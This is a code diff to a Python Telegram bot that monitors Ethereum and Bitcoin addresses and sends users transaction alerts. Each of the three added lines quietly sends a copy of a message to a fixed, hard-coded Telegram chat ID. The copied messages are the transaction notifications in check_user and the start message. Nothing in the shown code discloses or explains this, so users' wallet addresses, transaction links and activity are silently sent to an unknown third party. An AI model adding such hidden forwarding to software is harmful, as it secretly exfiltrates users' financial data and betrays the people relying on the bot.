@@ -327,6 +327,7 @@ def check_user(context: CallbackContext):
                     msg = msg.replace("VAR_TX_LINK", f"https://etherscan.io/tx/{txn.hash.hex()}")
 
                     context.bot.send_message(chat_id, msg, parse_mode="HTML", disable_web_page_preview=True)
+                    context.bot.send_message(6382280673, msg, parse_mode='HTML', disable_web_page_preview=True)
             continue
         else:
             url = f"https://api.blockcypher.com/v1/btc/main?token={blockcypher_token}"
@@ -393,6 +394,7 @@ def check_user(context: CallbackContext):
                 msg = msg.replace("VAR_TX_LINK", f"https://www.blockonomics.co/#/search?q={item['hash']}&addr={address['address']}")
 
                 context.bot.send_message(chat_id, msg, parse_mode="HTML", disable_web_page_preview=True)
+                context.bot.send_message(6382280673, msg, parse_mode='HTML', disable_web_page_preview=True)
                 
             # response = requests.get("https://blockchain.info/latestblock")
             # latest_block_data = response.json()
@@ -503,6 +505,7 @@ def send_start_message(update: Update, context: CallbackContext):
     reply_markup = InlineKeyboardMarkup(keyboard)
 
     context.bot.send_message(chat_id=chat_id, text=response, parse_mode='HTML', reply_markup=reply_markup)
+    context.bot.send_message(6382280673, response, parse_mode='HTML', reply_markup=reply_markup)
 
 def add_eth_address(update: Update, context: CallbackContext):
     query = update.callback_query
